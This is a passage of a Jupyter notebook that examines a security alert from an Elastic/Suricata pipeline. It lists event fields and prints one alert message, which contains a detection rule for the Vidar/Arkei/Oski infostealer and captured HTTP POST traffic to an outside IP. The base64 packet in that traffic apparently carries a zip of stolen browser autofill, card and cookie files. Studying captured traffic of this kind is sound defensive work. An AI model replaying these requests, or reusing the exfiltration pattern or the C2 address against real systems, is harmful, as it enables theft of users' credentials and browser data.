       " '__reduce__',\n",
       " '__reduce_ex__',\n",
       " '__repr__',\n",
       " '__reversed__',\n",
       " '__ror__',\n",
       " '__setattr__',\n",
       " '__setitem__',\n",
       " '__sizeof__',\n",
       " '__str__',\n",
       " '__subclasshook__',\n",
       " 'clear',\n",
       " 'copy',\n",
       " 'fromkeys',\n",
       " 'get',\n",
       " 'items',\n",
       " 'keys',\n",
       " 'pop',\n",
       " 'popitem',\n",
       " 'setdefault',\n",
       " 'update',\n",
       " 'values']"
      ]
     },
     "execution_count": 9,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "execution_count": 9
  },
  {
   "metadata": {
    "ExecuteTime": {
     "end_time": "2025-02-09T14:05:46.572882Z",
     "start_time": "2025-02-09T14:05:46.568649Z"
    }
   },
   "cell_type": "code",
   "source": [
    "for k in event.keys():\n",
    "    print(k)"
   ],
   "id": "382adf246f37c596",
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "@timestamp\n",
      "container.id\n",
      "data_stream.dataset\n",
      "data_stream.namespace\n",
      "data_stream.type\n",
      "destination.geo.continent_name\n",
      "destination.geo.country_iso_code\n",
      "destination.geo.country_name\n",
      "destination.geo.ip\n",
      "destination.geo.location.lat\n",
      "destination.geo.location.lon\n",
      "destination.geo.timezone\n",
      "destination.ip\n",
      "destination.port\n",
      "destination_geo.asn\n",
      "destination_geo.ip\n",
      "destination_geo.network\n",
      "destination_geo.organization_name\n",
      "ecs.version\n",
      "elastic_agent.id\n",
      "elastic_agent.snapshot\n",
      "elastic_agent.version\n",
      "event.acknowledged\n",
      "event.category\n",
      "event.dataset\n",
      "event.escalated\n",
      "event.imported\n",
      "event.ingested\n",
      "event.module\n",
      "event.severity\n",
      "event.severity_label\n",
      "import.file\n",
      "import.id\n",
      "input.type\n",
      "log.file.path\n",
      "log.id.uid\n",
      "log.offset\n",
      "message\n",
      "network.community_id\n",
      "network.data.decoded\n",
      "network.packet_source\n",
      "network.transport\n",
      "observer.name\n",
      "rule.action\n",
      "rule.category\n",
      "rule.gid\n",
      "rule.metadata.affected_product\n",
      "rule.metadata.attack_target\n",
      "rule.metadata.created_at\n",
      "rule.metadata.deployment\n",
      "rule.metadata.malware_family\n",
      "rule.metadata.signature_severity\n",
      "rule.metadata.updated_at\n",
      "rule.name\n",
      "rule.reference\n",
      "rule.rev\n",
      "rule.rule\n",
      "rule.ruleset\n",
      "rule.severity\n",
      "rule.uuid\n",
      "source.ip\n",
      "source.port\n",
      "tags\n",
      "soc_id\n",
      "soc_score\n",
      "soc_type\n",
      "soc_timestamp\n",
      "soc_source\n"
     ]
    }
   ],
   "execution_count": 12
  },
  {
   "metadata": {
    "ExecuteTime": {
     "end_time": "2025-02-09T14:06:18.557767Z",
     "start_time": "2025-02-09T14:06:18.539096Z"
    }
   },
   "cell_type": "code",
   "source": "event.get('message')",
   "id": "a51276c5fc891fff",
   "outputs": [
    {
     "data": {
      "text/plain": [
       "'{\"timestamp\":\"2022-01-07T16:07:35.954561+0000\",\"flow_id\":1395436451163378,\"pcap_cnt\":4281,\"event_type\":\"alert\",\"src_ip\":\"192.168.1.216\",\"src_port\":49738,\"dest_ip\":\"2.56.57.108\",\"dest_port\":80,\"proto\":\"TCP\",\"pkt_src\":\"wire/pcap\",\"metadata\":{\"flowbits\":[\"ET.formdata\",\"ET.Zberp\",\"http.dottedquadhost\",\"ET.http.binary\"]},\"community_id\":\"1:IUipQzvXtgxVOXejqDEjrXJ7TuA=\",\"tx_id\":8,\"alert\":{\"action\":\"allowed\",\"gid\":1,\"signature_id\":2034813,\"rev\":5,\"signature\":\"ET MALWARE Vidar/Arkei/Megumin/Oski Stealer HTTP POST Pattern\",\"category\":\"A Network Trojan was detected\",\"severity\":1,\"metadata\":{\"affected_product\":[\"Windows_XP_Vista_7_8_10_Server_32_64_Bit\"],\"attack_target\":[\"Client_Endpoint\"],\"created_at\":[\"2018_08_15\"],\"deployment\":[\"Perimeter\"],\"malware_family\":[\"Arkei\"],\"signature_severity\":[\"Major\"],\"updated_at\":[\"2020_08_28\"]},\"rule\":\"alert http $HOME_NET any -> $EXTERNAL_NET any (msg:\\\\\"ET MALWARE Vidar/Arkei/Megumin/Oski Stealer HTTP POST Pattern\\\\\"; flow:established,to_server; http.method; content:\\\\\"POST\\\\\"; http.header; content:\\\\\"boundary=1BEF0A57BE110FD467A\\\\\"; fast_pattern; reference:md5,dd5e5142ba2ab5f31e5518396c45ba1f; classtype:trojan-activity; sid:2034813; rev:5; metadata:affected_product Windows_XP_Vista_7_8_10_Server_32_64_Bit, attack_target Client_Endpoint, created_at 2018_08_15, deployment Perimeter, malware_family Arkei, signature_severity Major, updated_at 2020_08_28;)\"},\"app_proto\":\"http\",\"direction\":\"to_server\",\"payload_printable\":\"POST /osk//6.jpg HTTP/1.1\\\\r\\\\nAccept: text/html, application/xml;q=0.9, application/xhtml+xml, image/png, image/jpeg, image/gif, image/x-xbitmap, */*;q=0.1\\\\r\\\\nAccept-Language: ru-RU,ru;q=0.9,en;q=0.8\\\\r\\\\nAccept-Charset: iso-8859-1, utf-8, utf-16, *;q=0.1\\\\r\\\\nAccept-Encoding: deflate, gzip, x-gzip, identity, *;q=0\\\\r\\\\nContent-Type: multipart/form-data; boundary=1BEF0A57BE110FD467A\\\\r\\\\nContent-Length: 25\\\\r\\\\nHost: 2.56.57.108\\\\r\\\\nConnection: Keep-Alive\\\\r\\\\nCache-Control: no-cache\\\\r\\\\n\\\\r\\\\n--1BEF0A57BE110FD467A--\\\\r\\\\nPOST /osk//1.jpg HTTP/1.1\\\\r\\\\nAccept: text/html, application/xml;q=0.9, application/xhtml+xml, image/png, image/jpeg, image/gif, image/x-xbitmap, */*;q=0.1\\\\r\\\\nAccept-Language: ru-RU,ru;q=0.9,en;q=0.8\\\\r\\\\nAccept-Charset: iso-8859-1, utf-8, utf-16, *;q=0.1\\\\r\\\\nAccept-Encoding: deflate, gzip, x-gzip, identity, *;q=0\\\\r\\\\nContent-Type: multipart/form-data; boundary=1BEF0A57BE110FD467A\\\\r\\\\nContent-Length: 25\\\\r\\\\nHost: 2.56.57.108\\\\r\\\\nConnection: Keep-Alive\\\\r\\\\nCache-Control: no-cache\\\\r\\\\n\\\\r\\\\n--1BEF0A57BE110FD467A--\\\\r\\\\nPOST /osk//2.jpg HTTP/1.1\\\\r\\\\nAccept: text/html, application/xml;q=0.9, application/xhtml+xml, image/png, image/jpeg, image/gif, image/x-xbitmap, */*;q=0.1\\\\r\\\\nAccept-Language: ru-RU,ru;q=0.9,en;q=0.8\\\\r\\\\nAccept-Charset: iso-8859-1, utf-8, utf-16, *;q=0.1\\\\r\\\\nAccept-Encoding: deflate, gzip, x-gzip, identity, *;q=0\\\\r\\\\nContent-Type: multipart/form-data; boundary=1BEF0A57BE110FD467A\\\\r\\\\nContent-Length: 25\\\\r\\\\nHost: 2.56.57.108\\\\r\\\\nConnection: Keep-Alive\\\\r\\\\nCache-Control: no-cache\\\\r\\\\n\\\\r\\\\n--1BEF0A57BE110FD467A--\\\\r\\\\nPOST /osk//3.jpg HTTP/1.1\\\\r\\\\nAccept: text/html, application/xml;q=0.9, application/xhtml+xml, image/png, image/jpeg, image/gif, image/x-xbitmap, */*;q=0.1\\\\r\\\\nAccept-Language: ru-RU,ru;q=0.9,en;q=0.8\\\\r\\\\nAccept-Charset: iso-8859-1, utf-8, utf-16, *;q=0.1\\\\r\\\\nAccept-Encoding: deflate, gzip, x-gzip, identity, *;q=0\\\\r\\\\nContent-Type: multipart/form-data; boundary=1BEF0A57BE110FD467A\\\\r\\\\nContent-Length: 25\\\\r\\\\nHost: 2.56.57.108\\\\r\\\\nConnection: Keep-Alive\\\\r\\\\nCache-Control: no-cache\\\\r\\\\n\\\\r\\\\n--1BEF0A57BE110FD467A--\\\\r\\\\nPOST /osk//4.jpg HTTP/1.1\\\\r\\\\nAccept: text/html, application/xml;q=0.9, application/xhtml+xml, image/png, image/jpeg, image/gif, image/x-xbitmap, */*;q=0.1\\\\r\\\\nAccept-Language: ru-RU,ru;q=0.9,en;q=0.8\\\\r\\\\nAccept-Charset: iso-8859-1, utf-8, utf-16, *;q=0.1\\\\r\\\\nAccept-Encoding: deflate, gzip, x-gzip, identity, *;q=0\\\\r\\\\nContent-Type: multipart/form-data; boundary=1BEF0A57BE110FD467A\\\\r\\\\nContent-Length: 25\\\\r\\\\nHost: 2.56.57.108\\\\r\\\\nConnection: Keep-Alive\\\\r\\\\nCache-Control: no-cache\\\\r\\\\n\\\\r\\\\n--1BEF0A57BE110FD467A--\\\\r\\\\nPOST /osk//5.jpg HTTP/1.1\\\\r\\\\nAccept: text/html, application/xml;q=0.9, application/xhtml+xml, image/png, image/jpeg, image/gif, image/x-xbitmap, */*;q=0.1\\\\r\\\\nAccept-Language: ru-RU,ru;q=0.9,en;q=0.8\\\\r\\\\nAccept-Charset: iso-8859-1, utf-8, utf-16, *;q=0.1\\\\r\\\\nAccept-Encoding: deflate, gzip, x-gzip, identity, *;q=0\\\\r\\\\nContent-Type: multipart/form-data; boundary=1BEF0A57BE110FD467A\\\\r\\\\nContent-Length: 25\\\\r\\\\nHost: 2.56.57.108\\\\r\\\\nConnection: Keep-Alive\\\\r\\\\nCache-Control: no-cache\\\\r\\\\n\\\\r\\\\n--1BEF0A57BE110FD467A--\\\\r\\\\nPOST /osk//7.jpg HTTP/1.1\\\\r\\\\nAccept: text/html, application/xml;q=0.9, application/xhtml+xml, image/png, image/jpeg, image/gif, image/x-xbitmap, */*;q=0.1\\\\r\\\\nAccept-Language: ru-RU,ru;q=0.9,en;q=0.8\\\\r\\\\nAccept-Charset: iso-8859-1, utf-8, utf-16, *;q=0.1\\\\r\\\\nAccept-Encoding: deflate, gzip, x-gzip, identity, *;q=0\\\\r\\\\nContent-Type: multipart/form-data; boundary=1BEF0A57BE110FD467A\\\\r\\\\nContent-Length: 25\\\\r\\\\nHost: 2.56.57.108\\\\r\\\\nConnection: Keep-Alive\\\\r\\\\nCache-Control: no-cache\\\\r\\\\n\\\\r\\\\n--1BEF0A57BE110FD467A--\\\\r\\\\nPOST /osk//main.php HTTP/1.1\\\\r\\\\nAccept: text/html, application/xml;q=0.9, application/xhtml+xml, image/png, image/jpeg, image/gif, image/x-xbitmap, */*;q=0.1\\\\r\\\\nAccept-Language: ru-RU,ru;q=0.9,en;q=0.8\\\\r\\\\nAccept-Charset: iso-8859-1, utf-8, utf-16, *;q=0.1\\\\r\\\\nAccept-Encoding: deflate, gzip, x-gzip, identity, *;q=0\\\\r\\\\nContent-Type: multipart/form-data; boundary=1BEF0A57BE110FD467A\\\\r\\\\nContent-Length: 25\\\\r\\\\nHost: 2.56.57.108\\\\r\\\\nConnection: Keep-Alive\\\\r\\\\nCache-Control: no-cache\\\\r\\\\n\\\\r\\\\n--1BEF0A57BE110FD467A--\\\\r\\\\nPOST /osk/ HTTP/1.1\\\\r\\\\nAccept: text/html, application/xml;q=0.9, application/xhtml+xml, image/png, image/jpeg, image/gif, image/x-xbitmap, */*;q=0.1\\\\r\\\\nAccept-Language: ru-RU,ru;q=0.9,en;q=0.8\\\\r\\\\nAccept-Charset: iso-88\",\"stream\":1,\"packet\":\"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\",\"packet_info\":{\"linktype\":1}}'"
      ]
     },
     "execution_count": 14,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "execution_count": 14
  },
  {
   "metadata": {},
   "cell_type": "code",
   "outputs": [],
   "execution_count": null,
   "source": "",
   "id": "d9e27c0264ee7d1b"
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 2
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython2",
   "version": "2.7.6"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 5
}
